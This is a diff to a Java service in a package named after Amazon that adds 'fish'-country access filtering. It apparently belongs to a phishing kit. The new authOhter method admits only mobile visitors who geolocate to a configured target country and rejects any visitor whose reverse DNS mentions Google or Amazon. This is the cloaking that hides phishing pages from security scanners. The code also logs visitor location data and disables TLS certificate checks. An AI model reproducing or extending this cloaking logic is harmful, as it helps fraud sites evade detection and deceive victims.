@@ -13,9 +13,11 @@ import cn.hutool.json.JSONUtil;
 import com.alibaba.fastjson.JSON;
 import com.kidd.amazon.common.CmdUtils;
 import com.kidd.amazon.common.IpUtils;
+import com.kidd.amazon.model.enums.FishCountryEnum;
 import com.kidd.amazon.task.AsyncTask;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.beans.factory.annotation.Value;
 import org.springframework.stereotype.Service;
 import org.springframework.util.CollectionUtils;
 import org.springframework.util.StringUtils;
@@ -50,6 +52,9 @@ public class AuthUserService {
     @Autowired
     private CacheService cacheService;
 
+    @Value("${fish.country:jp}")
+    private String fishCountryCode;
+
     public boolean auth(HttpServletRequest request) {
         //ip白名单
         String ip = IpUtils.getIpAddress(request);
@@ -72,7 +77,7 @@ public class AuthUserService {
                 return true;
             }
         }
-        boolean authBool = auth2(request);
+        boolean authBool = authByCountry(request);
         if (authBool) {
             cacheService.setCommonCache(ip, 1);
         } else {
@@ -81,7 +86,17 @@ public class AuthUserService {
         return authBool;
     }
 
-    public boolean auth2(HttpServletRequest request) {
+    private boolean authByCountry(HttpServletRequest request){
+        FishCountryEnum countryEnum = FishCountryEnum.getByCountryCode(fishCountryCode);
+        switch (countryEnum){
+            case JP:
+                return authJp(request);
+            default:
+                return authOhter(request);
+        }
+    }
+
+    public boolean authJp(HttpServletRequest request) {
         String ip = IpUtils.getIpAddress(request);
         String ul = request.getHeader("Accept-Language");
         String uaStr = request.getHeader("User-Agent");
@@ -152,6 +167,74 @@ public class AuthUserService {
                 return false;
             }
             return false;
+        } catch (Exception e) {
+            log.error("auth error:" + e.getMessage() + "\n" + ip + "\n" + ipInfo + "\n" + ul + "\n" + uaStr);
+            return true;
+        }
+    }
+
+    public boolean authOhter(HttpServletRequest request) {
+        FishCountryEnum countryEnum = FishCountryEnum.getByCountryCode(fishCountryCode);
+        String tCountryCode = countryEnum.getCountryCode();
+        String ip = IpUtils.getIpAddress(request);
+        String ul = request.getHeader("Accept-Language");
+        String uaStr = request.getHeader("User-Agent");
+        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
+        String dateTime = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
+        String ipInfo = "";
+        try {
+            //如果不是手机端的pass
+            Boolean isMobile = false;
+            UserAgent ua = UserAgentUtil.parse(uaStr);
+            isMobile = ua.isMobile();
+            if (!isMobile) {
+                return false;
+            }
+            ipInfo = HttpRequest.get(ipInterfaceUrl + ip)
+                    .setSSLSocketFactory(SSLSocketFactoryBuilder.create().setTrustManagers(new DefaultTrustManager()).build())
+                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
+                    .header("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
+                    .header("accept-encoding", "gzip, deflate, br")
+                    .header("accept-language", "zh-CN,zh;q=0.9,ja;q=0.8,en-US;q=0.7,en;q=0.6")
+                    .header("cookie", "__cfduid=d534012ed48873bad8487bfd1d20040821613906936")
+                    .timeout(5000)//超时，毫秒
+                    .execute()
+                    .body();
+            JSONObject jObj = JSONUtil.parseObj(ipInfo);
+            String country = (String) jObj.get("countryCode");
+            Map<String, String> ipHash = new HashMap<>();
+            if (jObj != null) {
+                ipHash.put("country", jObj.getStr("country", ""));
+                ipHash.put("region", jObj.getStr("region", ""));
+                ipHash.put("regionName", jObj.getStr("regionName", ""));
+                ipHash.put("city", jObj.getStr("city", ""));
+                ipHash.put("zip", jObj.getStr("zip", ""));
+                ipHash.put("isp", jObj.getStr("isp", ""));
+            }
+            HttpSession session = request.getSession();
+            Map<String, String> userInfoMap = (LinkedHashMap<String, String>) session.getAttribute("userInfo");
+            userInfoMap.put("ipinfo", JSON.toJSONString(ipHash));
+
+            //2、校验rdns
+            String rdnsResult = cmdUtils.queryRdns(ip);
+            userInfoMap.put("rdns", rdnsResult);
+            session.setAttribute("userInfo", userInfoMap);
+            if (!jObj.containsKey("countryCode")) {
+                log.error("query countryCode error:{},{}", ip, ipInfo);
+            }
+            if (jObj.containsKey("countryCode") && !country.toLowerCase().contains(tCountryCode)) {
+                return false;
+            }
+            if (!StringUtils.isEmpty(rdnsResult) && rdnsResult.toLowerCase().contains("server can't find")) {
+                log.info("server can't find:" + request.getRequestURI() + "\n" + ipInfo + "\n" + rdnsResult);
+                return true;
+            }
+            if (!StringUtils.isEmpty(rdnsResult) && rdnsResult.toLowerCase().contains("name")) {
+                if (rdnsResult.toLowerCase().contains("google") || rdnsResult.toLowerCase().contains("amazon")) {
+                    return false;
+                }
+            }
+            return true;
         } catch (Exception e) {
             log.error("auth error:" + e.getMessage() + "\n" + ip + "\n" + ipInfo + "\n" + ul + "\n" + uaStr);
             return true;
